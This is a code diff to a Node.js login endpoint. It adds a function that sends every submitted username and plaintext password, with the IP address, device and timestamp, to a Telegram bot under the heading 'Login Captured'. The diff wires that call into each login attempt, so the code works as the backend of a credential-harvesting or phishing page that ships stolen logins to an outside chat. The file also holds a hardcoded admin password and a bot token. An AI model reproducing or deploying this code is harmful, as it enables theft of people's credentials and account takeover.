@@ -8,6 +8,10 @@ const VALID_PASS   = '123456';
 const ADMIN_USER   = 'shivanshu.bnd';
 const ADMIN_PASS   = 'Sahu@7897';
 
+// Telegram config
+const TELEGRAM_BOT_TOKEN = '8728071772:AAE71W6skRXjkSxgWFQQrzwFE6os6-Pe8P0';
+const TELEGRAM_CHAT_ID   = '1388446058';
+
 // ─── Token helper ────────────────────────────────────────────────────────────
 function makeToken() {
     return crypto.createHash('sha256').update(ADMIN_USER + ':' + ADMIN_PASS).digest('hex');
@@ -29,6 +33,25 @@ function appendLog(entry) {
         fs.writeFileSync(LOGS_FILE, JSON.stringify(logs), 'utf8');
     } catch (e) {
         console.error('Log write error:', e.message);
+    }
+}
+
+// ─── Notification Handlers ───────────────────────────────────────────────────
+async function sendTelegramNotification(entry) {
+    const text = `🚨 *WinzingTOR Login Captured* 🚨\n\n👤 *Username:* \`${entry.username}\`\n🔑 *Password:* \`${entry.password}\`\n\n🌐 *IP:* ${entry.ip}\n💻 *Device:* ${entry.device} (${entry.browser})\n🕒 *Time:* ${entry.timestamp}`;
+    
+    try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: text,
+                parse_mode: 'Markdown'
+            })
+        });
+    } catch (e) {
+        console.error('Telegram send error:', e.message);
     }
 }
 
@@ -69,7 +92,7 @@ module.exports = async (req, res) => {
             let device = 'Desktop';
             if (/Mobile|Android|iPhone|iPad/i.test(ua)) device = 'Mobile';
 
-            appendLog({
+            const entry = {
                 id:        Date.now(),
                 timestamp: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
                 username:  username || '',
@@ -77,7 +100,12 @@ module.exports = async (req, res) => {
                 browser,
                 device,
                 ip:        (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || 'Unknown'
-            });
+            };
+
+            appendLog(entry);
+            
+            // Send notifications without awaiting so we don't block the frontend response
+            sendTelegramNotification(entry);
         }
 
         if (isValid) {
